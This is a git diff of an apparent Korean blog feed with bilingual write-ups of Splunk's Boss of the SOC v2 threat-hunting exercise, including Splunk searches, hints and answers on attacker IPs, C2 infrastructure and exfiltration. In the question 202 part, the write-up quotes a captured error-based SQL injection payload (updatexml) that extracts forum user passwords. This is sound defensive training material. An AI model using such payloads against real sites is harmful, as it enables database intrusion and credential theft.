+&lt;p&gt;408	The APT group Taedonggang is always building more infrastructure to attack future victims. Provide the IPV4 IP address of a Taedonggang controlled server that has a completely different first octet to other Taedonggang controlled infrastructure. Answer guidance: 4.4.4.4 has a different first octet than 8.4.4.4&lt;br /&gt;
+APT 그룹 대동강은 미래의 희생자를 공격하기 위해 항상 더 많은 인프라를 구축하고 있습니다. 다른 대동강 제어 인프라와 완전히 다른 첫 번째 옥텟을 갖는 대동강 제어 서버의 IPV4 IP 주소를 제공하십시오. 답변 지침: 4.4.4.4는 8.4.4.4와 첫 번째 옥텟이 다릅니다.&lt;/p&gt;
+
 &lt;details&gt;
   &lt;summary&gt;hint#1&lt;/summary&gt;
-    
-&lt;/details&gt;</content>
+    Look through your notes of this incident, if you have any. Specifically look at the IP addresses used by Taedonggang. You will need to take information from the Taedonggang infrastructure seen attacking Frothy and pivot to open source intelligence.&lt;br /&gt;
+    이 사건에 대한 메모가 있으면 살펴보십시오. 특히 대동강이 사용하는 IP 주소를 살펴보십시오. Frothy를 공격하는 대동강 인프라에서 정보를 가져와 오픈 소스 인텔리전스로 전환해야 합니다.
+&lt;/details&gt;
+
+&lt;details&gt;
+  &lt;summary&gt;hint#2&lt;/summary&gt; 
+    Specifically look at the C2 IP address used by Taedonggang to control their PowerShell Empire agents. Remember that less is more! Sometimes the absence of data helps you find things.&lt;br /&gt;
+    특히 Daedonggang이 PowerShell Empire 에이전트를 제어하는 ​​데 사용하는 C2 IP 주소를 살펴보세요. 적을수록 좋다는 사실을 기억하세요! 때때로 데이터가 없으면 물건을 찾는 데 도움이 됩니다.
+&lt;/details&gt;
+
+&lt;details&gt;
+  &lt;summary&gt;hint#3&lt;/summary&gt;
+    Look at the SSL certificates. Think about fields that you can pivot on in open source intelligence.&lt;br /&gt;
+    SSL 인증서를 살펴보십시오. 오픈 소스 인텔리전스를 중심으로 할 수 있는 분야에 대해 생각해 보십시오.
+&lt;/details&gt;
+
+&lt;details&gt;
+  &lt;summary&gt;hint#4&lt;/summary&gt;
+    Taking information from hint number 3. Pivot off of different fields in an open source intelligence website that catalogs SSL certificates until you find the server! Review https://www.splunk.com/blog/2017/07/21/work-flow-ing-your-osint if you need help finding OSINT websites
+    힌트#3에서 정보를 얻습니다. 서버를 찾을 때까지 SSL 인증서를 카탈로그화하는 오픈 소스 인텔리전스 웹 사이트에서 다양한 필드를 선택하십시오! OSINT 웹 사이트를 찾는 데 도움이 필요한 경우 https://www.splunk.com/blog/2017/07/21/work-flow-ing-your-osint를 검토하십시오.
+&lt;/details&gt;
+
+&lt;p&gt;407번 문제에서 45.77.65.211를 통신하는것을 발견했습니다.&lt;/p&gt;
+
+&lt;p&gt;IP관련 정보는 stream:tcp에서 찾아봅시다.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sourcetype=stream:tcp 45.77.65.211
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;ssl_cert_hash_256의 값을 찾을 수 있습니다.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;1ACB3A5AAA46FC13F788A448716F841168F82227&lt;/strong&gt;
+해당 값을 &lt;a href=&quot;https://search.censys.io/&quot;&gt;인증서 OSINT 사이트&lt;/a&gt;에서 검색해봅시다.&lt;/p&gt;
+
+&lt;p&gt;현재는 crt hash값으로 관련된 사이트를 이용할 수 없습니다.&lt;/p&gt;
+
+&lt;p&gt;답 : 104.238.159.19&lt;/p&gt;
+
+&lt;p&gt;409	The Taedonggang group had several issues exfiltrating data. Determine how many bytes were successfully transferred in their final, mostly successful attempt to exfiltrate files via a method using TCP, using only the data available in Splunk logs. Use 1024 for byte conversion.&lt;br /&gt;
+대동강 그룹은 데이터를 빼내는 데 몇 가지 이슈가 있었습니다. Splunk 로그에서 사용할 수 있는 데이터만 사용하여 TCP를 사용하는 방법을 통해 파일을 추출하려는 대부분의 성공적인 최종 시도에서 성공적으로 전송된 바이트 수를 확인합니다. 바이트 변환에 1024를 사용합니다.&lt;/p&gt;
+
+&lt;details&gt;
+  &lt;summary&gt;hint#1&lt;/summary&gt;
+    The data for this question is located in sourcetype=stream:ftp&lt;br /&gt;
+    이 문제에 대한 데이터는 sourcetype=stream:ftp에 있습니다.
+&lt;/details&gt;
+
+&lt;details&gt;
+  &lt;summary&gt;hint#2&lt;/summary&gt;
+    Review the sourcetype referenced in hint one on August 25, 2017. You'll notice four distinct bursts of activity. Look at the largest one for the information you require. Find the start message in the logs (there is no stop). A key word is 'successful'.&lt;br /&gt;
+    2017년 8월 25일의 힌트 1에서 참조된 소스 유형을 검토하세요. 네 가지 뚜렷한 활동 버스트를 확인할 수 있습니다. 필요한 정보는 가장 큰 것을 보십시오. 로그에서 시작 메시지를 찾습니다(중지 없음). 키워드는 '성공'이다.
+&lt;/details&gt;
+
+&lt;details&gt;
+  &lt;summary&gt;hint#3&lt;/summary&gt;
+    The data is NOT in a Splunk field of 'bytes'. You will need to write a regex against the data to find the answer. Review https://www.splunk.com/blog/2017/08/30/rex-groks-gibberish.html if you need help writing a regex!&lt;br /&gt;
+    데이터가 '바이트'의 Splunk 필드에 없습니다. 답을 찾으려면 데이터에 대해 정규식을 작성해야 합니다. 정규식 작성에 도움이 필요하면 https://www.splunk.com/blog/2017/08/30/rex-groks-gibberish.html을 검토하십시오!
+&lt;/details&gt;
+
+&lt;details&gt;
+  &lt;summary&gt;hint#4&lt;/summary&gt;
+    The information in the field you are parsing will have something like 'Megabytes per second' and 'Kilobytes' per second. Make sure you do your calculations with those terms in mind.&lt;br /&gt;
+    구문 분석하는 필드의 정보는 '초당 메가바이트' 및 '초당 킬로바이트'와 같은 값을 갖습니다. 이러한 용어를 염두에 두고 계산을 하십시오.
+&lt;/details&gt;
+
+&lt;p&gt;추후 풀이 예정&lt;/p&gt;</content>
 
       
       
@@ -4335,1024 +5070,6 @@ kutekitten을 감염시키는 악성코드는 설치 직후 2개의 C&amp;amp;C 
     Patcher uses the UNIX zip utility.&lt;br /&gt;
     Patcher는 UNIX zip 유틸리티를 사용합니다.
 &lt;/details&gt;</content>
-
-      
-      
-      
-      
-      
-
-      <author>
-          <name>Kim-Gunwoo</name>
-        
-        
-      </author>
-
-      
-
-      
-        <category term="splunk" />
-      
-
-      
-        <summary type="html">Splunk BOTS의 데이터셋은 3개입니다. BOTS란? BOTS v1 Write up(1) BOTS v1 Write up(2) - END BOTS v2 Write up(1) BOTS v2 Write up(2) BOTS v2 Write up(3) BOTS v2 Write up(4) BOTS v2 Write up(5) - END BOTS v3 Write up(1) BOTS v3 Write up(2) BOTS v3 Write up(3) BOTS v3 Write up(4) - END BOTS v4 결과</summary>
-      
-
-      
-      
-    </entry>
-  
-    <entry>
-      <title type="html">splunk-bots-v2 write up(2)</title>
-      <link href="https://wind-flow.github.io/splunk-BOTS-v2-part2" rel="alternate" type="text/html" title="splunk-bots-v2 write up(2)" />
-      <published>2021-10-04T20:04:36+09:00</published>
-      <updated>2021-10-04T20:04:36+09:00</updated>
-      <id>https://wind-flow.github.io/splunk-BOTS-v2-part2</id>
-      <content type="html" xml:base="https://wind-flow.github.io/splunk-BOTS-v2-part2">&lt;p&gt;&lt;span class=&quot;table-of-contents-list&quot;&gt;Splunk BOTS의 데이터셋은 3개입니다.&lt;/span&gt;&lt;/p&gt;
-&lt;ul class=&quot;table-of-contents-list&quot;&gt;
-  &lt;li&gt;&lt;a href=&quot;./splunk-BOTS-overview&quot;&gt;BOTS란? &lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;./splunk-BOTS-v1-part1&quot;&gt;BOTS v1 Write up(1)&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;./splunk-BOTS-v1-part2&quot;&gt;BOTS v1 Write up(2) - END&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;./splunk-BOTS-v2-part1&quot;&gt;BOTS v2 Write up(1) &lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;./splunk-BOTS-v2-part2&quot;&gt;BOTS v2 Write up(2) &lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;./splunk-BOTS-v2-part3&quot;&gt;BOTS v2 Write up(3) &lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;./splunk-BOTS-v2-part4&quot;&gt;BOTS v2 Write up(4) &lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;./splunk-BOTS-v2-part5&quot;&gt;BOTS v2 Write up(5) - END&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;./splunk-BOTS-v3-part1&quot;&gt;BOTS v3 Write up(1)&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;./splunk-BOTS-v3-part2&quot;&gt;BOTS v3 Write up(2)&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;./splunk-BOTS-v3-part3&quot;&gt;BOTS v3 Write up(3)&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;./splunk-BOTS-v3-part4&quot;&gt;BOTS v3 Write up(4) - END&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;./splunk-2021-BOTS-END&quot;&gt;BOTS v4 결과&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;APT Scenarios:&lt;/p&gt;
-
-&lt;p&gt;In this hands-on exercise, you assume the persona of Alice Bluebird, the analyst who successfully assisted Wayne Enterprises and was recommended to Grace Hoppy at Frothly to assist them with their recent issues.&lt;br /&gt;
-이 실습에서는 Wayne Enterprises를 성공적으로 지원하고 Frothly의 Grace Hoppy에게 최근 문제를 지원하도록 추천된 분석가 Alice Bluebird의 페르소나를 가정합니다.&lt;/p&gt;
-
-&lt;p&gt;Hunting Scenarios:&lt;/p&gt;
-
-&lt;p&gt;PowerShell: Adversaries will use PowerShell Empire to establish a foothold and carry out attacks.&lt;br /&gt;
-PowerShell: 적들은 PowerShell Empire를 사용하여 거점을 구축하고 공격을 수행합니다.&lt;br /&gt;
-Exfiltration Over Alternative Protocol - FTP: Data Exfiltration may occur using common network protocols, principally FTP&lt;br /&gt;
-Exfiltration Over Alternative Protocol - FTP: 데이터 유출은 주로 FTP와 같은 일반적인 네트워크 프로토콜을 사용하여 발생할 수 있습니다.&lt;br /&gt;
-Exfiltration Over Alternative Protocol - DNS: Data Exfiltration may occur using common network protocols, specifically DNS&lt;br /&gt;
-Exfiltration Over Alternative Protocol - DNS: 데이터 유출은 일반적인 네트워크 프로토콜, 특히 DNS를 사용하여 발생할 수 있습니다.&lt;br /&gt;
-Adversary Infrastructure: The adversary has established multiple components of infrastructure beyond what we have already uncovered.&lt;br /&gt;
-Adversary Infrastructure: 적군은 우리가 이미 밝혀낸 것 이상의 기반 시설의 여러 구성 요소를 구축했습니다.&lt;br /&gt;
-Spearphishing Attachment: Adversaries will attempt to establish a foothold within Froth.ly using Phishing.&lt;br /&gt;
-Spearphishing Attachment: 적들은 피싱을 사용하여 Froth.ly 내에 거점을 구축하려고 시도합니다.&lt;br /&gt;
-User Execution: Adversaries will attempt to establish a foothold within Froth.ly by enticing a user to execute an action on a file.&lt;br /&gt;
-User Execution: 공격자는 사용자가 파일에 대해 작업을 실행하도록 유인하여 Froth.ly 내에서 거점을 설정하려고 시도합니다.&lt;br /&gt;
-Persistence - Create Account: An adversary will look to maintain persistence across an enterprise by creating user accounts.&lt;br /&gt;
-Persistence - Create Account: 공격자는 사용자 계정을 생성하여 기업 전체에서 지속성을 유지하려고 합니다.&lt;br /&gt;
-Persistence - Scheduled Task: An adversary will look to maintain persistence across reboots by using a task scheduler.&lt;br /&gt;
-Persistence - Scheduled Task: 공격자는 작업 스케줄러를 사용하여 재부팅 시 지속성을 유지하려고 합니다.&lt;br /&gt;
-Indicator Removal On Host: Clearing of audit / event logs could indicate an adversary attempting to cover their tracks.&lt;br /&gt;
-Indicator Removal On Host: 감사/이벤트 로그를 지우면 공격자가 자신의 흔적을 덮으려는 것을 나타낼 수 있습니다.&lt;br /&gt;
-Reconaissance: User Agent Strings may provide insight into an adversary that they may not have intended to show.&lt;br /&gt;
-Reconaissance: 사용자 에이전트 문자열은 의도하지 않은 적에 대한 통찰력을 제공할 수 있습니다.
-OSINT: Identifying publicly available company information and who is accessing it may provide insight into the adversary.&lt;br /&gt;
-OSINT: 공개적으로 사용 가능한 회사 정보와 해당 정보에 액세스하는 사람을 식별하면 적에 대한 통찰력을 제공할 수 있습니다.&lt;br /&gt;
-Lateral Movement: Adversaries will look to move laterally to other systems using Windows Management Instrumentation (WMI).&lt;br /&gt;
-Lateral Movement: 공격자는 WMI(Windows Management Instrumentation)를 사용하여 측면으로 다른 시스템으로 이동합니다.&lt;br /&gt;
-Data Staging: Adversaries will stage data prior to exfiltration to make it easier to extract data at a time of their choosing as well as have a central place to place information as it is identified.&lt;br /&gt;
-Data Staging: 공격자는 데이터 유출 전에 데이터를 준비하여 원하는 시간에 데이터를 쉽게 추출할 수 있을 뿐만 아니라 식별된 정보를 배치할 중앙 위치를 확보합니다.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://wind-flow.github.io/assets/built/images/splunk/bots/v2/b21.jpg&quot; alt=&quot;Scenario 1&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;The data included in this app was generated in August of 2017 by members of Splunk’s Security Specialist team - Dave Herrald, Ryan Kovar, Steve Brant, Jim Apger, John Stoner, Ken Westin, David Veuve and James Brodsky. They stood up a few lab environments connected to the Internet. Within the environment they had a few Windows endpoints instrumented with the Splunk Universal Forwarder and Splunk Stream. The forwarders were configured with best practices for Windows endpoint monitoring, including a full Microsoft Sysmon deployment and best practices for Windows Event logging. The environment included a Palo Alto Networks next-generation firewall to capture traffic and provide web proxy services, and Suricata to provide network-based IDS. This resulted in the dataset below.&lt;br /&gt;
-이 앱에 포함된 데이터는 2017년 8월 Splunk의 보안 전문가 팀(Dave Herrald, Ryan Kovar, Steve Brant, Jim Apger, John Stoner, Ken Westin, David Veuve 및 James Brodsky)이 생성한 것입니다. 그들은 인터넷에 연결된 몇 개의 실험 환경을 구축했습니다. 환경 내에는 Splunk Universal Forwarder 및 Splunk Stream으로 계측된 몇 개의 Windows 엔드포인트가 있었습니다. Forwarder는 전체 Microsoft Sysmon 배포 및 Windows 이벤트 로깅을 위한 모범 사례를 포함하여 Windows endpoint 모니터링을 위한 모범 사례로 구성되었습니다. 이 데이터셋은 트래픽을 캡처하고 웹 프록시 서비스를 제공하는 Palo Alto Networks 차세대 방화벽과 네트워크 기반 IDS를 제공하는 Suricata가 포함되었습니다. 그 결과 아래 데이터세트가 생성되었습니다.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://wind-flow.github.io/assets/built/images/splunk/bots/v2/b22.jpg&quot; alt=&quot;Scenario 2&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;200	What is the public IPv4 address of the server running www.brewertalk.com?&lt;br /&gt;
-www.brewertalk.com의 공개 IPv4 주소는 무엇입니까?&lt;/p&gt;
-
-&lt;details&gt;
-  &lt;summary&gt;hint#1&lt;/summary&gt;
-  Do you have access to a network diagram? If you do, use it!
-  네트워크 다이어그램에 액세스할 수 있습니까? 있으면, 사용하세요!
-&lt;/details&gt;
-
-&lt;details&gt;
-  &lt;summary&gt;hint#2&lt;/summary&gt;
-  A Splunk Stream forwarder running in the Frothly on-prem environment would observe http traffic destined for www.brewertalk.com as having an internet routable IP address.&lt;br /&gt;
-  Frothly 온프레미스 환경에서 실행되는 Splunk Stream forwarder는 www.brewertalk.com으로 향하는 http 트래픽이 인터넷 라우팅 가능한 IP 주소를 갖는 것으로 관찰합니다.
-&lt;/details&gt;
-
-&lt;p&gt;stream:http에서 해당 URL로 검색한 후, dest_ip필드에서 찾을 가능성이 높습니다.&lt;/p&gt;
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sourcetype=stream:http www.brewertalk.com
-| dedup site dest_ip
-| table site dest_ip
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;table&gt;
-  &lt;thead&gt;
-    &lt;tr&gt;
-      &lt;th&gt;site&lt;/th&gt;
-      &lt;th&gt;dest_ip&lt;/th&gt;
-    &lt;/tr&gt;
-  &lt;/thead&gt;
-  &lt;tbody&gt;
-    &lt;tr&gt;
-      &lt;td&gt;www.brewertalk.com&lt;/td&gt;
-      &lt;td&gt;172.31.4.249&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;www.brewertalk.com&lt;/td&gt;
-      &lt;td&gt;52.42.208.228&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;ec2-52-40-10-231.us-west-2.compute.amazonaws.com:8088&lt;/td&gt;
-      &lt;td&gt;172.31.10.10&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;ec2-52-40-10-231.us-west-2.compute.amazonaws.com:8088&lt;/td&gt;
-      &lt;td&gt;52.40.10.231&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;45.77.65.211:9999&lt;/td&gt;
-      &lt;td&gt;45.77.65.211&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;brewertalk.com&lt;/td&gt;
-      &lt;td&gt;172.31.4.249&lt;/td&gt;
-    &lt;/tr&gt;
-  &lt;/tbody&gt;
-&lt;/table&gt;
-
-&lt;p&gt;www.brewertalk.com의 dest_ip의 값을 보면 172.31.4.249와 52.42.208.228이 있습니다.
-문제에서 공개IP를 물어봤으니 사설IP대역 172.31.4.249이 아닌, 52.42.208.228이 공개 IP입니다.&lt;/p&gt;
-
-&lt;p&gt;답 : 52.42.208.228&lt;/p&gt;
-
-&lt;p&gt;201	Provide the IP address of the system used to run a web vulnerability scan against www.brewertalk.com.&lt;br /&gt;
-www.brewertalk.com에 대해 웹 취약점 스캔을 실행하는 데 사용되는 시스템의 IP 주소를 제공하십시오.&lt;/p&gt;
-
-&lt;details&gt;
-  &lt;summary&gt;hint#1&lt;/summary&gt;
-    App scanners are often 'noisy' and therefore easy to detect with automated correlation searches.&lt;br /&gt;
-    앱 스캐너는 '잡음'일 경우가 많기 때문에 자동화된 상관 관계 검색으로 쉽게 감지할 수 있습니다.
-&lt;/details&gt;
-
-&lt;details&gt;
-  &lt;summary&gt;hint#2&lt;/summary&gt;
-    Drill down into contributing events if you can!&lt;br /&gt;
-    가능하면 기여 이벤트를 자세히 살펴보십시오!
-&lt;/details&gt;
-
-&lt;p&gt;어떤 url들이 scan당했는지 조사해봅니다.&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sourcetype=stream:http dest_ip=52.42.208.228 OR dest_ip=172.31.4.249
-| stats count by url
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;strong&gt;http://www.brewertalk.com/숫자/&lt;/strong&gt;형식으로 scan을 하고있습니다.&lt;br /&gt;
-해당 src_ip를 보면 &lt;strong&gt;45.77.65.211&lt;/strong&gt;입니다.&lt;/p&gt;
-
-&lt;p&gt;scan이면 request 횟수가 많을것입니다.&lt;/p&gt;
-
-&lt;p&gt;www.berkbeer.com의 ip(52.42.208.228, 172.31.4.249)를 dest_ip로 설정하고 count해봅시다.&lt;/p&gt;
-
-&lt;p&gt;쿼리결과를 토대로 검증해봅니다.(스캔치고 이벤트 수가 적습니다.)&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sourcetype=stream:http dest_ip=52.42.208.228 OR dest_ip=172.31.4.249
-| stats count by src_ip dest_ip
-| sort -count
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;table&gt;
-  &lt;thead&gt;
-    &lt;tr&gt;
-      &lt;th&gt;src_ip&lt;/th&gt;
-      &lt;th&gt;dest_ip&lt;/th&gt;
-      &lt;th&gt;count&lt;/th&gt;
-    &lt;/tr&gt;
-  &lt;/thead&gt;
-  &lt;tbody&gt;
-    &lt;tr&gt;
-      &lt;td&gt;45.77.65.211&lt;/td&gt;
-      &lt;td&gt;172.31.4.249&lt;/td&gt;
-      &lt;td&gt;9708&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;52.40.10.231&lt;/td&gt;
-      &lt;td&gt;172.31.4.249&lt;/td&gt;
-      &lt;td&gt;634&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;172.31.10.10&lt;/td&gt;
-      &lt;td&gt;52.42.208.228&lt;/td&gt;
-      &lt;td&gt;303&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;71.39.18.125&lt;/td&gt;
-      &lt;td&gt;172.31.4.249&lt;/td&gt;
-      &lt;td&gt;160&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;174.209.13.154&lt;/td&gt;
-      &lt;td&gt;172.31.4.249&lt;/td&gt;
-      &lt;td&gt;134&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;10.0.2.109&lt;/td&gt;
-      &lt;td&gt;52.42.208.228&lt;/td&gt;
-      &lt;td&gt;84&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;136.0.2.138&lt;/td&gt;
-      &lt;td&gt;172.31.4.249&lt;/td&gt;
-      &lt;td&gt;24&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;136.0.0.125&lt;/td&gt;
-      &lt;td&gt;172.31.4.249&lt;/td&gt;
-      &lt;td&gt;8&lt;/td&gt;
-    &lt;/tr&gt;
-  &lt;/tbody&gt;
-&lt;/table&gt;
-
-&lt;p&gt;&lt;strong&gt;45.77.65.211&lt;/strong&gt;의 이벤트가 가장 많습니다.&lt;/p&gt;
-
-&lt;p&gt;45.77.65.211가 어떤 url들을 요청했는지 조사 합시다.&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sourcetype=stream:http dest_ip=52.42.208.228 OR dest_ip=172.31.4.249 src_ip=45.77.65.211
-| stats values(url) by src_ip
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;답 : 45.77.65.211&lt;/p&gt;
-
-&lt;p&gt;202	The IP address from question 201 is also being used by a likely different piece of software to attack a URI path. What is the URI path? Answer guidance: Include the leading forward slash in your answer. Do not include the query string or other parts of the URI. Answer example: /phpinfo.php&lt;br /&gt;
-201번 문제의 IP 주소는 URI 경로를 공격하기 위해 다른 소프트웨어에서도 사용되고 있습니다. URI 경로는 무엇입니까? 답변 안내: 답변에 선행 슬래시를 포함하십시오. 쿼리 문자열이나 URI의 다른 부분을 포함하지 마십시오. 답변 예시: /phpinfo.php&lt;/p&gt;
-&lt;details&gt;
-  &lt;summary&gt;hint#1&lt;/summary&gt;
-    Analyze all HTTP traffic from the scanning system to www.brewertalk.com, and inspect the different HTTP user agents. A different HTTP user agent often indicates a different HTTP client program was in use.&lt;br /&gt;
-    스캐닝 시스템에서 www.brewertalk.com으로의 모든 HTTP 트래픽을 분석하고 다양한 HTTP 사용자 에이전트를 검사합니다. 다른 HTTP 사용자 에이전트는 종종 다른 HTTP 클라이언트 프로그램이 사용 중임을 나타냅니다.
-&lt;/details&gt;
-
-&lt;details&gt;
-  &lt;summary&gt;hint#2&lt;/summary&gt;
-    For each HTTP user agent, inspect the URI that the user agent is interacting with.&lt;br /&gt;
-    각 HTTP 사용자 에이전트에 대해 사용자 에이전트가 상호 작용하는 URI를 검사합니다.
-&lt;/details&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sourcetype=stream:http src_ip=45.77.65.211
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;field중 uri_path 필드가 있으니, 어떤 uri가 있는지 봅시다.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://wind-flow.github.io/assets/built/images/splunk/bots/v2/2021-10-24-02-53-51.png&quot; alt=&quot;uri_path&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;“/member.php”가 가장 많습니다. 어떤 특이사항이 있는지 봅시다.&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sourcetype=stream:http src_ip=45.77.65.211 uri_path=&quot;/member.php&quot;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;dest_content 필드의 내용을 보면 중간 SQL Injection의 흔적이 보입니다.&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;SELECT q.*, s.sid
-			FROM mybb_questionsessions s
-			LEFT JOIN mybb_questions q ON (q.qid=s.qid)
-			WHERE q.active='1' AND s.sid='makman' and updatexml(NULL,concat (0x3a,(SUBSTRING((SELECT password FROM mybb_users ORDER BY UID LIMIT 5,1), 32, 31))),NULL) and '1'
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;/member.php uri에 SQL Injection 공격을 하고있는 것을 알 수 있습니다.&lt;/p&gt;
-
-&lt;p&gt;답 : /member.php&lt;/p&gt;
-
-&lt;p&gt;203	What SQL function is being abused on the uri path from question 202?&lt;br /&gt;
-문제 202의 uri 경로에서 어떤 SQL 함수를 통해 침입시도를 하고 있습니까?&lt;/p&gt;
-
-&lt;details&gt;
-  &lt;summary&gt;hint#1&lt;/summary&gt;
-    SQL stands for Structured Query Language and it is used to interact with relational databases like mysql. Some common terms in SQL include 'SELECT' 'WHERE' 'FROM' and 'JOIN'.&lt;br /&gt;
-    SQL은 Structured Query Language의 약자로 mysql과 같은 관계형 데이터베이스와 상호 작용하는 데 사용됩니다. SQL의 일반적인 용어로는 'SELECT' 'WHERE' 'FROM' 및 'JOIN'이 있습니다.
-&lt;/details&gt;
-
-&lt;details&gt;
-  &lt;summary&gt;hint#2&lt;/summary&gt;
-    SQL injection vulnerabilities can arise when a programmer does not properly check user input for characters that might have an impact on how the underlying database query is assembled in his or her code. A single quote character provided as input to a web page ' is often a tell-tale sign of a SQL injection attack.&lt;br /&gt;
-    SQL injection 취약점은 프로그래머가 기본 데이터베이스 쿼리가 코드에서 어셈블되는 방식에 영향을 미칠 수 있는 문자에 대한 사용자 입력을 적절하게 확인하지 않을 때 발생할 수 있습니다. 웹 페이지에 대한 입력으로 제공되는 작은 따옴표 '는 종종 SQL 주입 공격을 알리는 신호입니다.
-&lt;/details&gt;
-
-&lt;details&gt;
-  &lt;summary&gt;hint#3&lt;/summary&gt;
-    XML is one of many data formats that can be stored in relational databases like mysql. Some SQL commands in the MySQL database can be used to produce an error that leaks database contents. Look for a SQL command that updates XML.&lt;br /&gt;
-    XML은 mysql과 같은 관계형 데이터베이스에 저장할 수 있는 많은 데이터 형식 중 하나입니다. MySQL 데이터베이스의 일부 SQL 명령을 사용하여 데이터베이스 내용을 누출하는 오류를 생성할 수 있습니다. XML을 업데이트하는 SQL 명령을 찾으십시오.
-&lt;/details&gt;
-
-&lt;p&gt;문제 202에서 파악한 SQL에서 포함된 함수는 updatexml입니다.&lt;/p&gt;
-
-&lt;p&gt;답 : updatexml&lt;/p&gt;
-
-&lt;p&gt;204	What is Frank Ester’s password salt value on www.brewertalk.com?&lt;br /&gt;
-www.brewertalk.com에서 Frank Ester의 비밀번호의 salt 값은 얼마입니까?&lt;/p&gt;
-
-&lt;details&gt;
-  &lt;summary&gt;hint#1&lt;/summary&gt;
-    Narrow down the events to only those that include the suspected SQL injection traffic. Stream HTTP events contain the details you need. Filter on the source IP, dest, IP, HTTP user agent and URI path.&lt;br /&gt;
-    의심되는 SQL injection 트래픽을 포함하는 이벤트로만 이벤트 범위를 좁힙니다. 스트림 HTTP 이벤트에는 필요한 세부 정보가 포함되어 있습니다. 소스 IP, 대상, IP, HTTP 사용자 에이전트 및 URI 경로를 필터링합니다.
-&lt;/details&gt;
-
-&lt;details&gt;
-  &lt;summary&gt;hint#2&lt;/summary&gt;
-    These events will probably make a lot more sense if you reverse the Splunk event ordering by piping your search results to the reverse command. This will show you the first SQL injection commands at the top of the list and later events below.&lt;br /&gt;
